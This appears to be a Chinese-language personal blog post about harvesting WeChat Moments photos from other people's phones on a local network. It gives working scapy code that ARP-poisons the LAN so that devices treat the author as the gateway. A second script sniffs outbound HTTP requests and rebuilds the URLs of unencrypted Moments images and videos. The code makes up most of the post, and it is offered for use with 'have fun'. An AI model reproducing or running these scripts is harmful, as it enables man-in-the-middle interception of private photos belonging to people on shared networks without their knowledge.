---
layout: post
title: "收割朋友圈照片"
excerpt: "scapy sniff"
category: security
tags: [security]
disqus: true
---

大概源于前一阵很火的微信朋友圈红包照片。

我记得那天是刚从长亭科技膜拜完离开，看到朋友圈满目的红包照片。

首先是BJ Nodejs的群里有人开始晒不给红包看照片，后来这些搞计算机的同学都不给红包了。。。

好多天之后，我想，干脆爬下朋友圈吧。

于是有下文。

## 概述

目标：收割手机微信查看朋友圈时的照片

手段：ARP污染，告诉局域网内所有机器我是网关

## 设置系统转发

确保：

```bash
reverland@localhost » cat /proc/sys/net/ipv4/ip_forward                                                                                               ~/tmp/sshjs  
1
```

## ARP污染

首先，我熟悉的scapy

```python
#! /usr/bin/python
# -*- coding: utf-8 -*-
# 欺骗target我是网关

from scapy.all import *
import sys
import time

target = sys.argv[1]
gateway = sys.argv[2]
# 也许不必要
# 我只需要欺骗victim我是网关，把 请求 数据给我
# 获取网关
# route -n 0.0.0.0
### 本机ip
# ip addr show wlan0
# myip = '192.168.1.2'
# 获取目标MAC地址
# 1. arp -e 192.168.1.6
# 2. this way
# a, _ = srp(Ether(dst='ff:ff:ff:ff:ff:ff:ff')/ARP(op="who-has", psrc=myip, pdst=target),inter=RandNum(10,40), loop=0)
# targetMac = a[0][1]['ARP'].hwsrc

while 1:
    send(ARP(op="who-has", pdst=target, psrc=gateway))
    time.sleep(1)
```

实际上这么一广播所有的机器都会把你当作网关。。。只要你时刻不停的污染下去。

警告：可能会触发杀毒软件啥的警报

## 收割图片

匹配流量中图片地址就好，幸好微信消息是加密的, 只有朋友圈照片不加密。。

```python
#! /usr/bin/python
# -*- coding: utf-8 -*-

from scapy.all import *

def prn(x):
    s = x['Raw'].load.split(' ')[1]
    if s.find('/mmsns/') >= 0 and s.find('/0?tp=webp') >= 0:
        return 'http://mmsns.qpic.cn' + s.replace('tp=webp', '')
    elif s.find('snsvideodownload') >= 0:
        return 'http://vweixinf.tc.qq.com' + s

def lfilter(x):
    if x.haslayer('Raw') < 1:
        return False
    s = x['Raw'].load.split(' ')
    if s[0] == 'GET':
        return True
    return False

sniff(iface="wlan0", filter="outbound and tcp and (port 80)", prn=prn, store=0, lfilter=lfilter)
```

That is all, have fun!

scapy 简直杀人越货的必备。发现该项目已经从bitbucket迁移到github上了。

没有做的

1.  把两个部分放到两个线程里
